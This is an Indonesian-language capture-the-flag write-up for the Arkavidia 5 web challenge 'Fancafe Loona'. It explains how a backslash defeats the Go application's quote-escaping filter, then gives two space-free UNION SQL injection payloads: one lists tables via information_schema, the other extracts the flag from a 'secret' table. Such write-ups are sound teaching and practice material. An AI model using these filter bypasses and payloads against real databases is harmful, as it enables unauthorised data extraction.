---
comments: true
title: 'Arkavidia 5: Fancafe Loona'
date: 2019-02-13 17:00:00 +0000
category:
- ctf
tags:
- arkavidia
private: false

---
### Fancafe Loona - Web

Diberikan website menggunakan `go` yang mempunyai fitur untuk mencari post dan melihat detail dari post, dengan route sebagai berikut.

![](/uploads/Capture.PNG)

Kita juga diberikan akses terhadap source codenya yang bisa digunakan untuk memudahkan kita menemukan entrypoint eksploitasi pada aplikasi tersebut, dan ditemukan aplikasi sudah mengimplementasikan proteksi terhadap serangan SQL Injection.

  
![](/uploads/Capture-1.PNG)

Namun sayang nya filter tersebut belum cukup untuk mengamankan dari serangan `SQL Injection` karena dapat di bypass dengan memanfaatkan backslash `\` .

> '  => \\'
>
> \\' => \\\\'

Dengan menggunakan `\'` kita dapat melakukan bypass terhadap filter tersebut, kemudian lakukan union dengan normal namun tanpa menggunakan spasi.

Menggunakan payload berikut kita dapat memunculkan list table yang ada melalui information_schema.

    TESTING\')and(1)=(0)union(select(1),1,1,1,table_name,1,(1)from(information_schema.tables)where(table_schema)!=(0x696e666f726d6174696f6e5f736368656d61))#

![](/uploads/Capture-2.PNG)

Kemudian fetch flag dari table secret dengan payload `TESTING\')and(1)=(0)union(select(1),1,1,1,flag,1,(1)from(secret))#`

![](/uploads/Capture-3.PNG)